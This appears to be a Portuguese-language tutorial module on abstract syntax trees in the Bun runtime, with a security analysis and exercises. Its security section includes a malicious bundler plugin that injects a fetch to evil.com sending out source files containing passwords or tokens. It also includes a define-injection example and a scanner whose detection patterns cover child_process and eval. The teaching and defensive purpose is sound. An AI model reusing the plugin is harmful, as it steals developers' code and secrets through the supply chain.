# AST — Abstract Syntax Tree

> Como o Bun representa codigo como arvore e como transformacoes funcionam.

---

## Intuition (Feynman)

AST (Abstract Syntax Tree) e a representacao em arvore de um programa. `1 + 2 * 3` vira uma arvore onde `+` e a raiz, `1` e o filho esquerdo, e `*` e o filho direito (com `2` e `3` como seus filhos).

Por que isso importa para seguranca? Ferramentas de analise estatica, ofuscadores, e sanitizadores de codigo trabalham com a AST, nao com o texto. Manipular a AST e a forma correta (e potencialmente perigosa) de transformar codigo.

---

## Source Code

No repositorio `oven-sh/bun`:
```
src/
├── js_ast.zig           # Tipos de nos da AST
├── js_parser.zig        # Constroi a AST
├── js_printer.zig       # Serializa AST de volta para codigo
└── ast/
    └── ...
```

---

## Hands-On Analysis

### 1. Estrutura de uma AST

```
Codigo: const x = 1 + 2;

AST:
VariableDeclaration (const)
└── VariableDeclarator
    ├── Identifier: "x"
    └── BinaryExpression (+)
        ├── NumericLiteral: 1
        └── NumericLiteral: 2
```

```typescript
// Bun expoe AST via Bun.Transpiler
const transpiler = new Bun.Transpiler({ loader: "ts" });

// scan extrai imports sem parsear completamente
const imports = transpiler.scanImports(`
import React from "react";
import { useState } from "react";
import type { FC } from "react";
`);

console.log("Imports:", imports);
// [{ path: "react", kind: "import-statement" }, ...]
```

### 2. Transformacoes com Bun.Transpiler

```typescript
const transpiler = new Bun.Transpiler({
    loader: "tsx",
    define: {
        "process.env.NODE_ENV": JSON.stringify("production"),
        "__DEV__": "false",
    },
});

const source = `
import React from "react";

const isDev = __DEV__;
const env = process.env.NODE_ENV;

export const App = () => <div>{env}</div>;
`;

const result = transpiler.transformSync(source);
console.log(result);
// __DEV__ e process.env.NODE_ENV foram substituidos pelos valores definidos
```

### 3. Dead Code Elimination via AST

```typescript
// O bundler usa a AST para remover codigo morto
// Ex: condicional sempre falsa
const code = `
const DEBUG = false;

if (DEBUG) {
    console.log("mensagem secreta que sera removida");
    exposeInternalData();
}

console.log("isso permanece");
`;

const result = await Bun.build({
    entrypoints: [/* arquivo com esse codigo */],
    minify: true,
});

// "mensagem secreta" pode ter sido removida pelo tree-shaker
```

---

## Security Analysis

### Code Injection via AST Manipulation

```typescript
// Transformacoes de AST sao o vetores de supply chain attacks
// Um plugin de bundler malicioso pode:
// 1. Ler todos os arquivos fonte (via onLoad)
// 2. Modificar a AST antes de emitir
// 3. Injetar codigo malicioso

// Exemplo de plugin que injeta backdoor:
const evilPlugin = {
    name: "evil-transform",
    setup(build) {
        build.onLoad({ filter: /\.ts$/ }, async (args) => {
            let code = await Bun.file(args.path).text();

            // Injeta chamada de exfiltracao
            if (code.includes("password") || code.includes("token")) {
                code = `
// Exfiltration code injected by "evil" package
fetch("https://evil.com/collect", {
    method: "POST",
    body: JSON.stringify({ file: ${JSON.stringify(args.path)}, src: ${JSON.stringify(code)} })
}).catch(() => {});
` + code;
            }

            return { contents: code, loader: "ts" };
        });
    },
};
```

### Define Injection

```typescript
// define: substitui tokens em tempo de build
// Perigo: o que acontece se alguem controla os valores?

const transpiler = new Bun.Transpiler({
    define: {
        // O que acontece se o "valor" e codigo malicioso?
        "__INJECTED__": "process.exit(1)",
    },
});

const result = transpiler.transformSync("const x = __INJECTED__;");
// const x = process.exit(1);
// Codigo aparentemente inocente agora mata o processo
```

---

## Exercises

### Ex B2.1 — Analise de Imports

```typescript
// Escreva um scanner de imports para detectar dependencias suspeitas
const transpiler = new Bun.Transpiler({ loader: "ts" });

const suspiciousPackages = ["eval", "vm", "child_process", "shelljs"];

async function scanFile(path: string) {
    const source = await Bun.file(path).text();
    const imports = transpiler.scanImports(source);

    const suspicious = imports.filter(imp =>
        suspiciousPackages.some(pkg => imp.path.includes(pkg))
    );

    if (suspicious.length > 0) {
        console.warn(`[WARN] ${path} importa:`);
        suspicious.forEach(imp => console.warn(`  - ${imp.path} (${imp.kind})`));
    }

    return suspicious;
}

// Usar na pasta atual
import { glob } from "bun";
for await (const file of glob("src/**/*.ts").scan(".")) {
    await scanFile(file);
}
```

### Ex B2.2 — Define Fuzzing

```typescript
// Teste o que acontece com defines inesperados
const dangerous_defines = {
    "__PROC__": "process",
    "__REQ__": "require",
    "__GLOB__": "globalThis",
    "__EV__": "eval",
    "__FN__": "Function.prototype.constructor",
};

const transpiler = new Bun.Transpiler({
    loader: "ts",
    define: dangerous_defines,
});

const source = `
const p = __PROC__;
const r = __REQ__;
console.log(typeof p, typeof r);
`;

try {
    const result = transpiler.transformSync(source);
    console.log("Resultado:", result);
} catch (e) {
    console.log("Erro:", e.message);
}
```

### Ex B2.3 — Import Scanner de Seguranca

```typescript
// Scanner completo de seguranca para um projeto
import { glob } from "bun";

interface SecurityFinding {
    file: string;
    issue: string;
    line?: number;
}

async function securityScan(dir: string): Promise<SecurityFinding[]> {
    const findings: SecurityFinding[] = [];
    const transpiler = new Bun.Transpiler({ loader: "ts" });

    for await (const file of glob("**/*.{ts,js,tsx,jsx}").scan(dir)) {
        const source = await Bun.file(`${dir}/${file}`).text();

        // 1. Imports suspeitos
        const imports = transpiler.scanImports(source);
        for (const imp of imports) {
            if (imp.path === "child_process" || imp.path === "vm") {
                findings.push({ file, issue: `Import suspeito: ${imp.path}` });
            }
        }

        // 2. Padroes perigosos no texto
        const dangerousPatterns = [
            [/eval\s*\(/, "Uso de eval()"],
            [/new Function\s*\(/, "Uso de new Function()"],
            [/rejectUnauthorized:\s*false/, "TLS verification disabled"],
        ];

        for (const [pattern, issue] of dangerousPatterns) {
            if ((pattern as RegExp).test(source)) {
                findings.push({ file, issue: issue as string });
            }
        }
    }

    return findings;
}

const findings = await securityScan(".");
findings.forEach(f => console.log(`[${f.issue}] ${f.file}`));
```

---

## Checkpoint

[ ] Entende a estrutura de nos da AST
[ ] Usou Bun.Transpiler para transformar codigo
[ ] Entende como define substitui tokens no build
[ ] Implementou scanner de imports suspeitos
[ ] Entende que plugins de bundler tem acesso total ao codigo fonte

---

## Next

→ [`03-tree-shaking`](../03-tree-shaking/) — eliminacao de codigo morto
